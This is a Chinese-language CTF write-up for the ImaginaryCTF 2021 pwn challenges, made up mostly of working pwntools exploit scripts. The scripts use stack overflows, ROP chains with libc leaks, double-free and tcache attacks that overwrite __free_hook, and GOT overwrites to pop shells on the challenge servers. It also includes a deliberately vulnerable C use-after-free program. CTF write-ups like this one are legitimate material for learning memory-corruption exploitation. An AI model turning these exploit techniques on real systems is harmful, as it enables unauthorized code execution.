---
title: imaginaryctf2021-pwn-wp
categories: [CTF]
tags: [wp,pwn]

---

又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）
<!--more-->
## fake_canary

题目没有看canary，但自己写了类似canary的功能。通过栈溢出在类似canary填上伪造canary即可。

```python
from pwn import *
from libcfind import *

elf='./fake_canary'
e=ELF(elf)
#p=process(elf)
p=remote('chal.imaginaryctf.org',42002)
sleep(1)
"""
0x000000000040079c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007a0 : pop r14 ; pop r15 ; ret
0x00000000004007a2 : pop r15 ; ret
0x000000000040079b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400608 : pop rbp ; ret
0x00000000004007a3 : pop rdi ; ret
0x00000000004007a1 : pop rsi ; pop r15 ; ret
0x000000000040079d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400536 : ret
0x0000000000400542 : ret 0x200a
"""
#gdb.attach(p)
p.sendline('1'*8*5+p64(0xDEADBEEF)+p64(e.symbols['win'])+p64(0x00000000000400729))
sleep(1)
p.interactive()
```

## linonophobia

题目很有意思把printf函数地址偷偷换成puts地址。导致本菜鸡在那卡了半天。

但发现可以通过puts和栈溢出泄露出canary。

但发现str_bin_sh和onegatgad都打不通。分析elf发现`0x000000000601060`地址端有写入提示，在此写入后门。

```oython
from pwn import *
from libcfind import *

elf='./linonophobia'
e=ELF(elf)
context(arch=e.arch,log_level='debug')
p=remote('chal.imaginaryctf.org',42006)
#p=process(elf)
#
p.recv()
p.sendline('1'*8*31+'2'*8+'3'*0x8)
p.recvline()
#print(x)
x=p.recvline()[:7]
print(len(x))
print(x)
addr=u64(x.rjust(8,'\x00'))

log.info(hex(addr))
#gdb.attach(p)
pay='1'*8*31+'2'*8+'3'*0x8+p64(addr)
print(hex(len(pay)))
"""
0x000000000040086c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040086e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400870 : pop r14 ; pop r15 ; ret
0x0000000000400872 : pop r15 ; ret
0x000000000040086b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040086f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400638 : pop rbp ; ret
0x0000000000400873 : pop rdi ; ret
0x0000000000400871 : pop rsi ; pop r15 ; ret
0x000000000040086d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400566 : ret
0x0000000000400769 : ret 0x8948
0x0000000000400763 : ret 0xb60f
"""
rdi_ret=(0x0000000000400873 )

p.sendline('1'*8*31+'2'*8+'3'*0x8+p64(addr)+p64(0)+p64(rdi_ret)+p64(e.got['read'])+p64(e.sym['puts'])+p64(e.sym['main']))
puts_addr=u64(p.recvline()[:-1].ljust(8,'\x00'))
log.info(hex(puts_addr))
x=finder('read',puts_addr,num=1)
p.sendline('1'*8*31+'2'*8+'3'*0x8+p64(addr)+p64(0)+'\x00'*0x30)
# rbx rbp r12 r13 r14 r15 
def csu(g1,g2,buf,rbx,rbp,r12,r13,r14,r15,lest_cell):
    pay=p64(g1)+p64(0)
    pay=pay+p64(rbx)+p64(rbp)
    pay=pay+p64(r12)+p64(r13)+p64(r14)+p64(r15)
    pay=pay+p64(g2)
    pay=pay+'\00'*0x38+p64(lest_cell)

    return pay
p.recv()
p.sendline('1'*8*31+'2'*8+'3'*0x8+p64(addr)+p64(0)+p64(rdi_ret)+p64(0x000000000601060)+p64(x.dump('gets'))+p64(rdi_ret)+p64(0x000000000601060)+p64(x.dump('system'))+p64(e.sym['main']))
#gdb.attach(p)
p.sendline('1')
p.sendline('/bin/bash\x00')
p.interactive()

```



## memory_pile

常规2.27libc 的fast bin 二次释放题，劫持`__free_hook`写入system,来得到shall。

```python
from pwn import *
from libcfind import *
elf='./memory_pile'

e=ELF(elf)
p=remote('chal.imaginaryctf.org',42007)
#p=process(elf)
p.recvuntil("I'll even give you a present, if you manage to unwrap it...\n")
printf_addr=int(p.recvline(),16)
def add(num):
    p.sendline('1')
    p.recvuntil('With great power comes great responsibility >')
    p.sendline(str(num))

def free(num):
    p.sendline('2')
    p.recvuntil('With great power comes great responsibility >')
    p.sendline(str(num))


def edit(num,text):
    p.sendline('3')
    p.recvuntil('With great power comes great responsibility >')
    p.sendline(str(num))
    p.recvuntil('Let me have it, boss >')
    p.sendline(text)

add(0)
add(1)
add(2)
free(0)
free(1)
free(0)

log.info('printf:'+hex(printf_addr))
x=finder('printf',printf_addr)
edit(0,p64(x.dump('__free_hook')))
add(0)

add(1)
edit(1,p64(x.dump('system')))
edit(2,'/bin/sh\x00')
free(2)
#gdb.attach(p)

p.interactive()
```

## stackoverflow

rt，简单栈溢出。

```python
from pwn import *


e=ELF('./stackoverflow')
#p=process('./stackoverflow')
#db.attach(p)
p=remote('chal.imaginaryctf.org',42001)
sleep(1)
p.sendline('1'*8*5+p64(0x69637466))

p.interactive()
```



## the_first_fit

简单的uaf利用。

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
  int choice, choice2;
  char *a = malloc(128);
  char *b;
  setvbuf(stdout,NULL,2,0);
  setvbuf(stdin,NULL,2,0);
  while (1) {
    printf("a is at %p\n", a);
    printf("b is at %p\n", b);
    printf("1: Malloc\n2: Free\n3: Fill a\n4: System b\n> ");
    scanf("%d", &choice);
    switch(choice) {
      case 1:
              printf("What do I malloc?\n(1) a\n(2) b\n>> ");
              scanf("%d", &choice2);
              if (choice2 == 1)
                a = malloc(128);
              else if (choice2 == 2)
                b = malloc(128);
              break;
      case 2:
              printf("What do I free?\n(1) a\n(2) b\n>> ");
              scanf("%d", &choice2);
              if (choice2 == 1)
                free(a);
              else if (choice2 == 2)
                free(b);
              break;
      case 3: printf(">> "); scanf("%8s", a); break;
      case 4: system((char*)b); break;
      default: return -1;
    }
  }
  return 0;
}
```

## string_editor_1

有意识的一道题，一次只能写入一个字符。但是由于存在数组下标越界，修改管理tetach，range 0x30 tache大于7且第一个的值向`__free_hook`附近（free_hook-0x20）.利用tache 优先级高于tache的特性，申请到free_hook-0x20的空间，在`__free_hook`写入`system`的地址，在free_hook-0x20写入`/bin/sh`。

```python
from pwn import *
from libcfind import *
elf='string_editor_1'

e=ELF(elf)
p=remote('chal.imaginaryctf.org',42004)
#process(elf)
p.recvuntil('But first, a word from our sponsors:')
system_addr=int(p.recvline(),16)
log.info('system:'+hex(system_addr))
x=finder('system',system_addr)
free_hook=p64(x.dump('__free_hook')-0x20)
p.sendline(str(-0x290))
p.sendline('x')
for i in range(len(free_hook),-1,-1):
    
    p.sendline(str(-0x211+i))
    p.sendline(free_hook[i-1])
p.sendline('15')
p.sendline(p8(0))
p.sendline('14')
p.sendline(p8(0))
system_addrs=p64(system_addr)
for i in range(len(system_addrs),-1,-1):
    
    p.sendline(str(0x20+i-1))
    p.sendline(system_addrs[i-1])
shall='\x00/bin/sh\x00'
for i in range(len(shall),-1,-1):
    p.sendline(str(-i+8))
    p.sendline(shall[-i])
#gdb.attach(p)
p.interactive()
```

### string_editor_2

由于只能下溢出（负数），但能修改got表。修改strpy.got为pintf.got.plt.来通过格式化字符串泄露libcbase。

这里本地打通了，远程一直没打通，赛后专门看来dalao wp发现方法对的，可能是kali的原因（orw）。

想了个傻雕方法用`add-sysmbols`来猜与真实libcbase的差值 。

然后在修改strpy.got为system的真实地址，得到shell。



```python
from pwn import *
from libcfind import *
elf='./string_editor_2'
#0x601080
e=ELF(elf)
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
print('__libc_start_main-l:'+hex(libc.sym['__libc_start_main']))
LIBC=ELF('./libc.so.6')
print('__libc_start_main-r:'+hex(LIBC.sym['__libc_start_main']))
p=remote('chal.imaginaryctf.org',42005)
#p=process(elf)
"""
shall='\x00/bin/sh\x00'
for i in range(len(shall),-1,-1):
    p.sendline(str(-i+8))
    p.sendline(shall[-i])
"""
#864e50
sys=p64(e.sym['printf']).rjust(8,'\x00')
print(sys)
for i in range(len(sys),-1,-1):
    p.sendline(str(-0x69+i))
    p.sendline(sys[i-1])
    p.recvuntil('Done.')
shall='%13$p'
#shall='%16$p' #0x100000000
#shall='%13$p'
for i in range(len(shall),-1,-1):
    p.sendline(str(-i+8))
    p.sendline(shall[-i])
    p.recvuntil('Done.')
p.sendline(str(15))
#gdb.attach(p)
p.recvuntil('3. Exit\n')
p.sendline(str(2))
p.recvuntil('***')

addr=int(p.recvuntil('%')[:-1],16)-0x3f-0xb4

#gdb.attach(p)
print(hex(addr-LIBC.sym['__libc_start_main']))

x=finder('__libc_start_main',addr)


sys=p64(x.dump('system')).rjust(8,'\x00')
print(sys)
for i in range(len(sys),-1,-1):
    p.sendline(str(-0x69+i))
    p.sendline(sys[i-1])
    p.recvuntil('Done.')
shall='\x00\x00/bin/sh\x00'
for i in range(len(shall),-1,-1):
    p.sendline(str(-i+8))
    p.sendline(shall[-i])
    p.recvuntil('Done.')

#db.attach(p)
p.sendline(str(15))
p.sendline(str(2))

p.interactive()
```

